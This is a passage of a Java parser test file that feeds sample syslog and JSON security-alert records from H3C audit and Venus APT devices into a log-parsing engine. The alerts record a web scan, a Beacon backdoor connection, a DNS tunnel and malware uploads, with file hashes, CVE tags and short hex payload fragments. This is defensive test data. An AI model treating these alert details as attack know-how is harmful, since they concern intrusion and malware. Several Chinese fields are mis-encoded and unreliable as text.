      data = "<6>May 29 09:58:21 H3C;110104700118072615188454;ipv4;3; statistic_traffic: user_name=zongjie;ugname=imc_2;umac=0C:DA:41:B4:C7:41;uip=10.12.21.25;appname=其他UDP;appgname=网络协议;up=1064;down=0;create_time=1559095080;end_time=1559095140";
      parse(botuEngine, data);
      data = "<6>May 29 09:58:21 H3C;110104700118072615188454;ipv4;3; other_app: user_name=lulu1;user_group_name=USER1;term_platform=;term_device=PC;pid=1;src_mac=0c:da:41:b4:c7:41;src_ip=10.12.13.10;dst_ip=122.70.131.254;dst_port=443;app_name=无界浏览器;app_cat_name=网络代理;handle_action=0;account=;action_name=操作;content=;msg=";
      parse(botuEngine, data);
      data = "<6>May 29 09:58:21 H3C;110104700118072615188454;ipv4;3; im: user_name=10.12.29.100;user_group_name=anonymous;term_platform=;term_device=;pid=1;src_mac=0c:da:41:b4:c7:41;src_ip=10.12.29.100;dst_ip=121.51.86.132;dst_port=80;app_name=微信;app_cat_name=即时通讯;handle_action=0;account=;action_name=登录;content=;msg=";
      parse(botuEngine, data);
      data = "<6>May 29 09:58:21 H3C;110104700118072615188454;ipv4;3; relax_stock: user_name=xuzhenyu;user_group_name=USER1;term_platform=;term_device=PC;pid=1;src_mac=0c:da:41:b4:c7:41;src_ip=10.12.15.61;dst_ip=122.72.3.216;dst_port=80;app_name=搜狐视频;app_cat_name=流媒体;handle_action=0;account=;action_name=看视频;parent_info=;msg=";
      parse(botuEngine, data);
      data = "<6>May 29 09:53:16 H3C;110104700118072615188454;ipv4;3; file_transfer: user_name=lijingjing01;user_group_name=USER1;term_platform=;term_device=PC;pid=1;src_mac=0c:da:41:b4:c7:41;src_ip=10.12.7.110;dst_ip=223.119.248.16;dst_port=80;app_name=HTTP鏂囦欢涓嬭浇;app_cat_name=鏂囦欢浼犺緭;handle_action=0;account=;action_name=鎺ユ敹;file_name=/ncsi.txt;msg=";
      parse(botuEngine, data);
      data = "<6>May 29 09:48:10 H3C;110104700118072615188454;ipv4;3; social_log: user_name=yangqin;user_group_name=USER1;term_platform=;term_device=;pid=1;src_mac=0c:da:41:b4:c7:41;src_ip=10.12.28.22;dst_ip=39.156.6.85;dst_port=58350;app_name=鏂版氮寰\uE1BC崥;app_cat_name=缃戠粶绀惧尯;handle_action=0;account=5681927388;action_name=鐧诲綍;subject=;content=imei=__IMEI__;msg=";
      parse(botuEngine, data);

    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAptVenus() {
    String parserFile = "./resources/parsers/apt_venus_tiantian_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "{\"src_ip\": \"192.168.61.1\",\"src_ip_v6\": \"\",\"dst_ip\": \"192.168.61.141\",\"dst_ip_v6\": \"\",\"src_ip_country\": \"内网\",\"src_ip_city\": \"\",\"dst_ip_country\": \"中国\",\"dst_ip_city\": \"北京市\",\"src_port\": 1759,\"dst_port\": 80,\"src_mac\": \"00:0d:60:fb:19:4b\",\"dst_mac\": \"00:50:ba:cb:95:d0\",\"exploited_host\": 0,\"exploited_ip\": \"\",\"event_type_id\": 11040785,\"src_host_identity\": 1,\"dst_host_identity\": 2,\"attack_port\": 1759,\"attacked_port\": 80,\"event_level_name\": \"中危\",\"security_id\": 40801,\"security_type\": \"网络扫描\",\"attack_type\": \"网络扫描\",\"protocol\": \"HTTP\",\"subject\": \"HTTP_安全扫描_WEB扫描器行为\",\"attck\": \"T1190\",\"detect_att_fail\": 1,\"apptype\": \"webAttack,scanDetect\",\"stage_name\": \"\",\"stage_sub_name\": \"\",\"currency_name\": \"\",\"cve\": \"\",\"message\": \"687474702E75726C3D2F62616E2E6461743B687474702E6D73\",\"mpls\": \"\",\"vlan\": \"\",\"attack_status\": \"失败\",\"organizations\": \"\",\"families\": \"\",\"categories\": \"\",\"ioc\": \"\",\"threat_score\": 2,\"intelligence_type_tag\": 7,\"raw_id\": \"ff030e0674f4548b800e428508fb70ac\",\"log_type\": \"event-log\",\"start_time\": 1666864442,\"dev_ip\": \"10.5.20.171\",\"dev_type\": \"APT\",\"index_date\": \"2022-10-27\",\"log_status\": \"待处置\",\"xff_ip\": \"0.0.0.0\",\"x_real_ip\": \"0.0.0.0\",\"cdn_src_ip\": \"0.0.0.0\",\"http_host\": \"219.234.94.233\",\"http_url\": \"\\/ban.dat\",\"http_cookie\": \"\",\"http_referer\": \"\",\"http_useragent\": \"wnikto\\/1.3d (WNikto32\\/1.3d )\",\"retcode\": \"404\"}";
      parse(botuEngine, data);
      data = "{\"src_ip\": \"192.168.174.150\",\"src_ip_v6\": \"\",\"dst_ip\": \"192.168.174.132\",\"dst_ip_v6\": \"\",\"src_ip_country\": \"内网\",\"src_ip_city\": \"内网\",\"dst_ip_country\": \"内网\",\"dst_ip_city\": \"内网\",\"src_port\": 49159,\"dst_port\": 5566,\"src_mac\": \"00:0c:29:59:d9:20\",\"dst_mac\": \"00:0c:29:00:ad:dd\",\"exploited_host\": 2,\"exploited_ip\": \"192.168.174.150\",\"event_type_id\": 780,\"src_host_identity\": 2,\"dst_host_identity\": 3,\"attack_port\": 49159,\"attacked_port\": 5566,\"event_level_name\": \"高危\",\"security_id\": 30609,\"security_type\": \"木马后门\",\"attack_type\": \"远控后门\",\"protocol\": \"TCP\",\"subject\": \"TCP_后门_Beacon.Payload_连接\",\"attck\": \"\",\"detect_att_fail\": 1,\"apptype\": \"zombietrojanworm,Ransom\",\"stage_name\": \"\",\"stage_sub_name\": \"\",\"currency_name\": \"\",\"cve\": \"\",\"message\": \"7463702E7061796C6F61643D4D5AE8000000005B52455589E5\",\"mpls\": \"\",\"vlan\": \"\",\"attack_status\": \"正在利用\",\"organizations\": \"\",\"families\": \"\",\"categories\": \"\",\"ioc\": \"\",\"threat_score\": 0,\"intelligence_type_tag\": 0,\"raw_id\": \"bf8d9dff1ceab4a41eb128452ad8357f\",\"log_type\": \"event-log\",\"start_time\": 1666684166,\"dev_ip\": \"10.5.20.233\",\"dev_type\": \"APT\",\"index_date\": \"2022-10-25\",\"log_status\": \"待处置\",\"tcp_payload\": \"4D5AE8000000005B52455589E581C393450000FFD381C36662\"}";
      parse(botuEngine, data);
      data = "{\"src_ip\": \"192.100.10.180\",\"src_ip_v6\": \"\",\"dst_ip\": \"192.168.20.9\",\"dst_ip_v6\": \"\",\"src_ip_country\": \"中国\",\"src_ip_city\": \"北京市\",\"dst_ip_country\": \"内网\",\"dst_ip_city\": \"内网\",\"src_port\": 57690,\"dst_port\": 36987,\"src_mac\": \"18:db:f2:5a:fb:72\",\"dst_mac\": \"38:ad:be:31:a9:41\",\"exploited_host\": 0,\"exploited_ip\": \"\",\"event_type_id\": 1007728,\"src_host_identity\": 1,\"dst_host_identity\": 2,\"attack_port\": 57690,\"attacked_port\": 36987,\"event_level_name\": \"中危\",\"security_id\": 20402,\"security_type\": \"信息泄露\",\"attack_type\": \"敏感信息泄露\",\"protocol\": \"UDP\",\"subject\": \"UDP_NFS_共享文件服务敏感信息泄露漏洞尝试\",\"attck\": \"\",\"detect_att_fail\": 0,\"apptype\": \"webAttack,attackViews\",\"stage_name\": \"\",\"stage_sub_name\": \"\",\"currency_name\": \"\",\"cve\": \"CVE-1999-0554\",\"message\": \"7564702E7061796C6F61643DB6178AA8000000000000000200\",\"mpls\": \"\",\"vlan\": \"\",\"attack_status\": \"攻击尝试\",\"organizations\": \"\",\"families\": \"\",\"categories\": \"\",\"ioc\": \"\",\"threat_score\": 0,\"intelligence_type_tag\": 0,\"raw_id\": \"jrwmujpwz40z48x24341b6ce11b58f82\",\"log_type\": \"event-log\",\"start_time\": 1666684091,\"dev_ip\": \"10.5.20.233\",\"dev_type\": \"APT\",\"index_date\": \"2022-10-25\",\"log_status\": \"待处置\"}";
      parse(botuEngine, data);
      data = "{\"src_ip\": \"192.168.61.1\",\"src_ip_v6\": \"\",\"dst_ip\": \"192.168.61.141\",\"dst_ip_v6\": \"\",\"src_ip_country\": \"内网\",\"src_ip_city\": \"\",\"dst_ip_country\": \"中国\",\"dst_ip_city\": \"北京市\",\"src_port\": 1759,\"dst_port\": 80,\"src_mac\": \"00:0d:60:fb:19:4b\",\"dst_mac\": \"00:50:ba:cb:95:d0\",\"exploited_host\": 0,\"exploited_ip\": \"\",\"event_type_id\": 11040785,\"src_host_identity\": 1,\"dst_host_identity\": 2,\"attack_port\": 1759,\"attacked_port\": 80,\"event_level_name\": \"中危\",\"security_id\": 40801,\"security_type\": \"网络扫描\",\"attack_type\": \"网络扫描\",\"protocol\": \"HTTP\",\"subject\": \"HTTP_安全扫描_WEB扫描器行为\",\"attck\": \"T1190\",\"detect_att_fail\": 1,\"apptype\": \"webAttack,scanDetect\",\"stage_name\": \"\",\"stage_sub_name\": \"\",\"currency_name\": \"\",\"cve\": \"\",\"message\": \"687474702E75726C3D2F62616E2E6461743B687474702E6D73\",\"mpls\": \"\",\"vlan\": \"\",\"attack_status\": \"失败\",\"organizations\": \"\",\"families\": \"\",\"categories\": \"\",\"ioc\": \"\",\"threat_score\": 2,\"intelligence_type_tag\": 7,\"raw_id\": \"ff030e0674f4548b800e428508fb70ac\",\"log_type\": \"event-log\",\"start_time\": 1666864442,\"dev_ip\": \"10.5.20.171\",\"dev_type\": \"APT\",\"index_date\": \"2022-10-27\",\"log_status\": \"待处置\",\"xff_ip\": \"0.0.0.0\",\"x_real_ip\": \"0.0.0.0\",\"cdn_src_ip\": \"0.0.0.0\",\"http_host\": \"219.234.94.233\",\"http_url\": \"\\/ban.dat\",\"http_cookie\": \"\",\"http_referer\": \"\",\"http_useragent\": \"wnikto\\/1.3d (WNikto32\\/1.3d )\",\"retcode\": \"404\"}";
      parse(botuEngine, data);
      data = "{\"src_ip\": \"192.168.174.150\",\"src_ip_v6\": \"\",\"dst_ip\": \"192.168.174.132\",\"dst_ip_v6\": \"\",\"src_ip_country\": \"内网\",\"src_ip_city\": \"内网\",\"dst_ip_country\": \"内网\",\"dst_ip_city\": \"内网\",\"src_port\": 49159,\"dst_port\": 5566,\"src_mac\": \"00:0c:29:59:d9:20\",\"dst_mac\": \"00:0c:29:00:ad:dd\",\"exploited_host\": 2,\"exploited_ip\": \"192.168.174.150\",\"event_type_id\": 780,\"src_host_identity\": 2,\"dst_host_identity\": 3,\"attack_port\": 49159,\"attacked_port\": 5566,\"event_level_name\": \"高危\",\"security_id\": 30609,\"security_type\": \"木马后门\",\"attack_type\": \"远控后门\",\"protocol\": \"TCP\",\"subject\": \"TCP_后门_Beacon.Payload_连接\",\"attck\": \"\",\"detect_att_fail\": 1,\"apptype\": \"zombietrojanworm,Ransom\",\"stage_name\": \"\",\"stage_sub_name\": \"\",\"currency_name\": \"\",\"cve\": \"\",\"message\": \"7463702E7061796C6F61643D4D5AE8000000005B52455589E5\",\"mpls\": \"\",\"vlan\": \"\",\"attack_status\": \"正在利用\",\"organizations\": \"\",\"families\": \"\",\"categories\": \"\",\"ioc\": \"\",\"threat_score\": 0,\"intelligence_type_tag\": 0,\"raw_id\": \"bf8d9dff1ceab4a41eb128452ad8357f\",\"log_type\": \"event-log\",\"start_time\": 1666684166,\"dev_ip\": \"10.5.20.233\",\"dev_type\": \"APT\",\"index_date\": \"2022-10-25\",\"log_status\": \"待处置\",\"tcp_payload\": \"4D5AE8000000005B52455589E581C393450000FFD381C36662\"}";
      parse(botuEngine, data);
      data = "{\"src_ip\": \"192.168.30.130\",\"src_ip_v6\": \"\",\"dst_ip\": \"192.168.30.129\",\"dst_ip_v6\": \"\",\"src_ip_country\": \"内网\",\"src_ip_city\": \"内网\",\"dst_ip_country\": \"内网\",\"dst_ip_city\": \"内网\",\"src_port\": 39782,\"dst_port\": 53,\"src_mac\": \"00:0c:29:f4:73:02\",\"dst_mac\": \"00:0c:29:7e:74:b8\",\"exploited_host\": 2,\"exploited_ip\": \"192.168.30.130\",\"event_type_id\": 1040404,\"src_host_identity\": 2,\"dst_host_identity\": 4,\"attack_port\": 39782,\"attacked_port\": 53,\"event_level_name\": \"高危\",\"security_id\": 52301,\"security_type\": \"隐蔽隧道\",\"attack_type\": \"隐蔽隧道\",\"protocol\": \"DNS\",\"subject\": \"DNS_木马_可疑dns隧道工具_连接\",\"attck\": \"\",\"detect_att_fail\": 0,\"apptype\": \"zombietrojanworm,suspiciousBehavior,dnsTunnel,Ransom\",\"stage_name\": \"\",\"stage_sub_name\": \"\",\"currency_name\": \"\",\"cve\": \"\",\"message\": \"646E737172796E616D653D646E736361742E66366332303162\",\"mpls\": \"\",\"vlan\": \"\",\"attack_status\": \"正在利用\",\"organizations\": \"\",\"families\": \"\",\"categories\": \"\",\"ioc\": \"\",\"threat_score\": 0,\"intelligence_type_tag\": 0,\"raw_id\": \"mlfxn2n020xdgmwb318b413902e4bfec\",\"log_type\": \"event-log\",\"start_time\": 1666687357,\"dev_ip\": \"10.5.20.233\",\"dev_type\": \"APT\",\"index_date\": \"2022-10-25\",\"log_status\": \"待处置\",\"dns_payload\": \"AAEB8180000100010000000006646E73636174226636633230\"}";
      parse(botuEngine, data);
      data = "{\"log_type\": \"dac_apt_upload\",\"taskId\": \"85324C74408343328296D1AEDFF72881\",\"fileId\": \"DC2A1C5A133B4DD49414C5FF28169E3E\",\"submitType\": 1,\"originId\": \"\",\"rec_id\": \"\",\"md5\": \"0a98d78b84fd69d9505012c5b0f56542\",\"sha1\": \"6a92eddc504f7934720b501bcb6475ca642838fe\",\"sha256\": \"a65725bad5cefdae29ffd34ade1b6effaa498110cd334e897dc6b87ce74f1a41\",\"sha512\": \"\",\"ssdeep\": \"JDED30l92ErYiYM43ZYKWVJrscDME3vtfTedw4ozJtfFOdgpdw4ozJtfFOdgPdwM:qDEN1qZcjrscywb\\/wbZwbpwbH1t\",\"start_time\": 1666841002,\"end_time\": 1666841002,\"dev_ip\": \"10.5.20.171\",\"dev_id\": \"\",\"file_name\": \"0a98d78b84fd69d9505012c5b0f56542.rtf\",\"protocol\": \"HTTP\",\"spread_type\": \"\",\"src_ip\": \"192.168.14.136\",\"src_ip_v6\": \"\",\"src_ip_city\": \"\",\"src_ip_country\": \"内网\",\"src_ip_longitude\": \"\",\"src_ip_latitude\": \"\",\"dst_ip\": \"192.168.14.26\",\"dst_ip_v6\": \"\",\"dst_ip_city\": \"\",\"dst_ip_country\": \"内网\",\"dst_ip_longitude\": \"\",\"dst_ip_latitude\": \"\",\"src_port\": 4961,\"dst_port\": 80,\"event_level_name\": \"高危\",\"file_type\": \"rtf\",\"file_size\": 159561,\"callback\": 0,\"is_0day\": 1,\"dev_type\": \"APT\",\"native_result\": 0,\"native_type\": \"\",\"evil_code_type\": \"\",\"che_result_static\": \"\",\"suspicious_url\": \"\",\"suspicious_addr\": \"\",\"suspicious_domain\": \"\",\"evilTag\": \"C&C检测,威胁行为,CVE-2012-0158,漏洞利用\",\"threat_score\": 0,\"categories\": \"\",\"organizations\": \"\",\"families\": \"\",\"ioc\": \"\",\"intelligence_type_tag\": 0,\"attck\": \"\",\"subreport_info\": \"[{ \\\"id\\\": \\\"70b9f289e6574da99f3235ef1ca205ad\\\", \\\"subreport_id\\\": \\\"70b9f289e6574da99f3235ef1ca205ad\\\", \\\"snapshot_name\\\": \\\"\\\", \\\"time\\\": \\\"1666780500\\\", \\\"type\\\": \\\"avscan\\\", \\\"isapilist\\\": \\\"0\\\", \\\"score\\\": \\\"70\\\", \\\"scantype\\\": \\\"kavscan\\\", \\\"screenshots\\\": \\\"1717908787\\\", \\\"index_date\\\": \\\"2022-10-26\\\" },{ \\\"id\\\": \\\"315c4e10cee64e0c9459523d71b69913\\\", \\\"subreport_id\\\": \\\"315c4e10cee64e0c9459523d71b69913\\\", \\\"snapshot_name\\\": \\\"win7-of-2010\\\", \\\"time\\\": \\\"1666780576\\\", \\\"type\\\": \\\"cuckoo\\\", \\\"isapilist\\\": \\\"1\\\", \\\"score\\\": \\\"70\\\", \\\"scantype\\\": \\\"cuckoo\\\", \\\"screenshots\\\": \\\"1\\\", \\\"index_date\\\": \\\"2022-10-26\\\", \\\"screenshot_id\\\": [ \\\"496e68bcc92549c69dc438f954b2a8b6\\\" ] }]\",\"protocol_msg\": \"{\\\"requestDomain\\\":\\\"MTkyLjE2OC4xNC4yNjo4MA==\\\",\\\"requestResource\\\":\\\"LzEvMGE5OGQ3OGI4NGZkNjlkOTUwNTAxMmM1YjBmNTY1NDIucnRm\\\",\\\"fileDirection\\\":\\\"1\\\"}\",\"severity\": 80,\"relate_id\": \"3_2ed0374ba509811b\",\"vlan\": \"\",\"xff_ip\": \"0.0.0.0\",\"x_real_ip\": \"0.0.0.0\",\"x_real_ip_v6\": \"\",\"cdn_src_ip\": \"0.0.0.0\",\"cdn_src_ip_v6\": \"\",\"url\": \"\\/1\\/0a98d78b84fd69d9505012c5b0f56542.rtf\"}";
      parse(botuEngine, data);
      data = "{\"log_type\": \"dac_apt_upload\",\"taskId\": \"86709B7FB7864B5BBB472C456E840070\",\"fileId\": \"49A2F3876ED44F8EA9CE442601E94D4E\",\"submitType\": 1,\"originId\": \"\",\"rec_id\": \"\",\"md5\": \"553f843084fe122221f2fa35089a8a6f\",\"sha1\": \"c8e85983ade1b9e0b0f8d2344322393f703ebae6\",\"sha256\": \"9ac8f29da503a48e5cc9bf92f279505343195cc5d9e05c49bd41cab282455009\",\"sha512\": \"\",\"ssdeep\": \"TCyEZbeSqkialJ0Eqmw\\/73SQKafYkOrAyrvc:r\",\"start_time\": 1666843378,\"end_time\": 1666843378,\"dev_ip\": \"10.5.20.171\",\"dev_id\": \"\",\"file_name\": \"553f843084fe122221f2fa35089a8a6f_1666843377136348_0.eml\",\"protocol\": \"POP3\",\"spread_type\": \"\",\"src_ip\": \"60.60.60.61\",\"src_ip_v6\": \"\",\"src_ip_city\": \"\",\"src_ip_country\": \"日本\",\"src_ip_longitude\": \"140.183252\",\"src_ip_latitude\": \"35.335416\",\"dst_ip\": \"60.60.60.60\",\"dst_ip_v6\": \"\",\"dst_ip_city\": \"\",\"dst_ip_country\": \"日本\",\"dst_ip_longitude\": \"140.183252\",\"dst_ip_latitude\": \"35.335416\",\"src_port\": 2425,\"dst_port\": 110,\"event_level_name\": \"高危\",\"file_type\": \"eml\",\"file_size\": 4408429,\"callback\": 0,\"is_0day\": 1,\"dev_type\": \"APT\",\"native_result\": 0,\"native_type\": \"\",\"evil_code_type\": \"\",\"che_result_static\": \"\",\"suspicious_url\": \"\",\"suspicious_addr\": \"\",\"suspicious_domain\": \"\",\"evilTag\": \"CVE-2017-11882,漏洞利用,间谍程序,木马程序,感染型病毒,CVE-2012-0158,包含附件,后门程序\",\"threat_score\": 0,\"categories\": \"\",\"organizations\": \"\",\"families\": \"\",\"ioc\": \"\",\"intelligence_type_tag\": 0,\"attck\": \"\",\"subreport_info\": \"[{ \\\"id\\\": \\\"937748833d344918bff8531fae9b2cb5\\\", \\\"subreport_id\\\": \\\"937748833d344918bff8531fae9b2cb5\\\", \\\"snapshot_name\\\": \\\"\\\", \\\"time\\\": \\\"1666783578\\\", \\\"type\\\": \\\"avscan\\\", \\\"isapilist\\\": \\\"0\\\", \\\"score\\\": \\\"70\\\", \\\"scantype\\\": \\\"kavscan\\\", \\\"screenshots\\\": \\\"1714500405\\\", \\\"index_date\\\": \\\"2022-10-26\\\" },{ \\\"id\\\": \\\"da0a034c938c4b1b8387a78b299f4b7a\\\", \\\"subreport_id\\\": \\\"da0a034c938c4b1b8387a78b299f4b7a\\\", \\\"snapshot_name\\\": \\\"win7-of-2007\\\", \\\"time\\\": \\\"1666783676\\\", \\\"type\\\": \\\"cuckoo\\\", \\\"isapilist\\\": \\\"0\\\", \\\"score\\\": \\\"0\\\", \\\"scantype\\\": \\\"cuckoo\\\", \\\"screenshots\\\": \\\"1\\\", \\\"index_date\\\": \\\"2022-10-26\\\", \\\"screenshot_id\\\": [ \\\"6fbd46502fac4daa8de3e706a65b0ff3\\\" ] }]\",\"protocol_msg\": \"{\\\"sender\\\":\\\"eGlueGluQHRlc3QuY29tLmNu\\\",\\\"sender_email\\\":\\\"\\\",\\\"cc\\\":\\\"\\\",\\\"attach_dir\\\":\\\"\\/vdisk\\/apt\\/0\\/attach\\/f235a40d57d0428067d698233da06873\\\",\\\"recipient\\\":\\\"bmluZ25pbmdAdGVzdC5jb20uY258eGlueGluQHRlc3QuY29tLmNu\\\",\\\"recipientcc\\\":\\\"ningning@test.com.cn|xinxin@test.com.cn|\\\",\\\"mailhide\\\":\\\"\\\",\\\"emailTitle\\\":\\\"包含6个附件的测试\\\", \\\"messageID\\\":\\\"672b4822be868e08eb1aac74d5a8ea06\\\", \\\"url\\\":\\\"\\\"}\",\"severity\": 60,\"relate_id\": \"3_48464f48a54adc44\",\"vlan\": \"\",\"ms_id\": \"82B27037537E09093E2FC6AD376CFDB6\",\"match_tag\": 0,\"recipient\": \"ningning@test.com.cn|xinxin@test.com.cn|\",\"sender\": \"eGlueGluQHRlc3QuY29tLmNu\"}";
      parse(botuEngine, data);
      data = "{\"log_type\": \"dac_apt_upload\",\"taskId\": \"9379CD1826B44FEAB4D874AF9690A1B9\",\"fileId\": \"DC2A1C5A133B4DD49414C5FF28169E3E\",\"submitType\": 1,\"originId\": \"\",\"rec_id\": \"\",\"md5\": \"0a98d78b84fd69d9505012c5b0f56542\",\"sha1\": \"6a92eddc504f7934720b501bcb6475ca642838fe\",\"sha256\": \"a65725bad5cefdae29ffd34ade1b6effaa498110cd334e897dc6b87ce74f1a41\",\"sha512\": \"\",\"ssdeep\": \"JDED30l92ErYiYM43ZYKWVJrscDME3vtfTedw4ozJtfFOdgpdw4ozJtfFOdgPdwM:qDEN1qZcjrscywb\\/wbZwbpwbH1t\",\"start_time\": 1666843872,\"end_time\": 1666843872,\"dev_ip\": \"10.5.20.171\",\"dev_id\": \"\",\"file_name\": \"0a98d78b84fd69d9505012c5b0f56542.rtf\",\"protocol\": \"FTP\",\"spread_type\": \"\",\"src_ip\": \"192.168.14.27\",\"src_ip_v6\": \"\",\"src_ip_city\": \"\",\"src_ip_country\": \"内网\",\"src_ip_longitude\": \"\",\"src_ip_latitude\": \"\",\"dst_ip\": \"192.168.14.26\",\"dst_ip_v6\": \"\",\"dst_ip_city\": \"\",\"dst_ip_country\": \"内网\",\"dst_ip_longitude\": \"\",\"dst_ip_latitude\": \"\",\"src_port\": 60547,\"dst_port\": 57092,\"event_level_name\": \"高危\",\"file_type\": \"rtf\",\"file_size\": 159561,\"callback\": 0,\"is_0day\": 1,\"dev_type\": \"APT\",\"native_result\": 0,\"native_type\": \"\",\"evil_code_type\": \"\",\"che_result_static\": \"\",\"suspicious_url\": \"\",\"suspicious_addr\": \"\",\"suspicious_domain\": \"\",\"evilTag\": \"C&C检测,威胁行为,CVE-2012-0158,漏洞利用\",\"threat_score\": 0,\"categories\": \"\",\"organizations\": \"\",\"families\": \"\",\"ioc\": \"\",\"intelligence_type_tag\": 0,\"attck\": \"\",\"subreport_info\": \"[{ \\\"id\\\": \\\"70b9f289e6574da99f3235ef1ca205ad\\\", \\\"subreport_id\\\": \\\"70b9f289e6574da99f3235ef1ca205ad\\\", \\\"snapshot_name\\\": \\\"\\\", \\\"time\\\": \\\"1666780500\\\", \\\"type\\\": \\\"avscan\\\", \\\"isapilist\\\": \\\"0\\\", \\\"score\\\": \\\"70\\\", \\\"scantype\\\": \\\"kavscan\\\", \\\"screenshots\\\": \\\"1717908787\\\", \\\"index_date\\\": \\\"2022-10-26\\\" },{ \\\"id\\\": \\\"315c4e10cee64e0c9459523d71b69913\\\", \\\"subreport_id\\\": \\\"315c4e10cee64e0c9459523d71b69913\\\", \\\"snapshot_name\\\": \\\"win7-of-2010\\\", \\\"time\\\": \\\"1666780576\\\", \\\"type\\\": \\\"cuckoo\\\", \\\"isapilist\\\": \\\"1\\\", \\\"score\\\": \\\"70\\\", \\\"scantype\\\": \\\"cuckoo\\\", \\\"screenshots\\\": \\\"1\\\", \\\"index_date\\\": \\\"2022-10-26\\\", \\\"screenshot_id\\\": [ \\\"496e68bcc92549c69dc438f954b2a8b6\\\" ] }]\",\"protocol_msg\": \"{\\\"serverName\\\":\\\"MTkyLjE2OC4xNC4yNg==\\\",\\\"userName\\\":\\\"YWRtaW4=\\\",\\\"fileDirection\\\":\\\"0\\\"}\",\"severity\": 80,\"relate_id\": \"dd9dee45bb2b4075\",\"vlan\": \"\",\"ms_id\": \"CC109729286C93164C871E2CF69DC46C\",\"match_tag\": 0,\"server_name\": \"\",\"user_name\": \"\"}";
      parse(botuEngine, data);
      data = "{\"log_type\": \"dac_apt_upload\",\"taskId\": \"E429908B2A0B4F269208DD017E77FD5A\",\"fileId\": \"F4E526CF065E49FB87FD5A6E0E437C7C\",\"submitType\": 1,\"originId\": \"\",\"rec_id\": \"\",\"md5\": \"70cc0efa6aa1537856fb081ef91ca1d4\",\"sha1\": \"ce43b1f329842e38e3ef22a2fb67c8884f8ce501\",\"sha256\": \"122a6698df4bd4accbe62aa38f7cd06e02197eab086419b0fc0fee13138ccec4\",\"sha512\": \"\",\"ssdeep\": \"je1SFZBp63EokY\\/UU9baSI\\/WS9uHiSRvpB:jPFZBp6Hkt0baSYuH\",\"start_time\": 1666849267,\"end_time\": 1666849267,\"dev_ip\": \"10.5.20.171\",\"dev_id\": \"\",\"file_name\": \"70cc0efa6aa1537856fb081ef91ca1d4_20190227175915.exe\",\"protocol\": \"SMB\",\"spread_type\": \"\",\"src_ip\": \"192.168.14.71\",\"scr_ip_v6\": \"\",\"src_ip_city\": \"\",\"src_ip_country\": \"内网\",\"src_ip_longitude\": \"\",\"src_ip_latitude\": \"\",\"dst_ip\": \"192.168.14.129\",\"dst_ip_v6\": \"\",\"dst_ip_city\": \"\",\"dst_ip_country\": \"内网\",\"dst_ip_longitude\": \"\",\"dst_ip_latitude\": \"\",\"src_port\": 49449,\"dst_port\": 445,\"event_level_name\": \"安全\",\"file_type\": \"exe\",\"file_size\": 446464,\"callback\": 0,\"is_0day\": 0,\"dev_type\": \"APT\",\"native_result\": 0,\"native_type\": \"\",\"evil_code_type\": \"\",\"che_result_static\": \"\",\"suspicious_url\": \"\",\"suspicious_addr\": \"\",\"suspicious_domain\": \"\",\"evilTag\": \"\",\"threat_score\": 32591,\"categories\": \"\",\"organizations\": \"\",\"families\": \"\",\"ioc\": \"\",\"intelligence_type_tag\": 0,\"attck\": \"\",\"subreport_info\": \"\",\"protocol_msg\": \"{\\\"serverName\\\":\\\"\\\",\\\"userName\\\":\\\"\\\",\\\"fileDirection\\\":\\\"0\\\",\\\"path\\\":\\\"\\\"}\",\"severity\": 0,\"relate_id\": \"3_5de0e04a854b0df4\",\"vlan\": \"\",\"ms_id\": \"6B7DB58CD37F9B02CB2A1A92674145DB\",\"match_tag\": 0,\"server_name\": \"\",\"path\": \"\"}";
      parse(botuEngine, data);
      data = "{\"log_type\": \"dac_apt_upload\",\"taskId\": \"F7C93C06A05B4D40B1953BD718731414\",\"fileId\": \"B4B19BA038724FE89D0FF2C9D406FEF8\",\"submitType\": 1,\"originId\": \"\",\"rec_id\": \"\",\"md5\": \"7e4e584aee38b470149bc8962d7c893d\",\"sha1\": \"d6b1906c61a1a16351a41bfccd0ec00d7b6dbe55\",\"sha256\": \"6bc003daea0fbeedd6766eb2eb585b68e6f0b8dfcbd8c189eeb59d8e7a0873e3\",\"sha512\": \"\",\"ssdeep\": \"Vs0TyykiiQkYvMYhcFrmZvRsJU2PSDS\\/bSepXYy3D5:VRTy3iiQkWhcFrmZvRsJU2PKS\\/bPpXYq\",\"start_time\": 1666845248,\"end_time\": 1666845248,\"dev_ip\": \"10.5.20.171\",\"dev_id\": \"\",\"file_name\": \"rfc5661.txt\",\"protocol\": \"NFS\",\"spread_type\": \"\",\"src_ip\": \"172.16.4.7\",\"src_ip_v6\": \"\",\"src_ip_city\": \"\",\"src_ip_country\": \"内网\",\"src_ip_longitude\": \"\",\"src_ip_latitude\": \"\",\"dst_ip\": \"172.16.7.142\",\"dst_ip_v6\": \"\",\"dst_ip_city\": \"\",\"dst_ip_country\": \"内网\",\"dst_ip_longitude\": \"\",\"dst_ip_latitude\": \"\",\"src_port\": 738,\"dst_port\": 2049,\"event_level_name\": \"安全\",\"file_type\": \"txt\",\"file_size\": 1551989,\"callback\": 0,\"is_0day\": 0,\"dev_type\": \"APT\",\"native_result\": 0,\"native_type\": \"\",\"evil_code_type\": \"\",\"che_result_static\": \"\",\"suspicious_url\": \"\",\"suspicious_addr\": \"\",\"suspicious_domain\": \"\",\"evilTag\": \"\",\"threat_score\": 32587,\"categories\": \"\",\"organizations\": \"\",\"families\": \"\",\"ioc\": \"\",\"intelligence_type_tag\": 0,\"attck\": \"\",\"subreport_info\": \"\",\"protocol_msg\": \"{\\\"serverName\\\":\\\"dmlydA==\\\",\\\"nfsVer\\\":\\\"4\\\",\\\"fileDirection\\\":\\\"0\\\"}\",\"severity\": 0,\"relate_id\": \"8b64f145ab22f79c\",\"vlan\": \"\",\"ms_id\": \"F3E76952D1C11EA899EE25B061AB696F\",\"match_tag\": 0,\"server_name\": \"\",\"path\": \"\"}";
      parse(botuEngine, data);
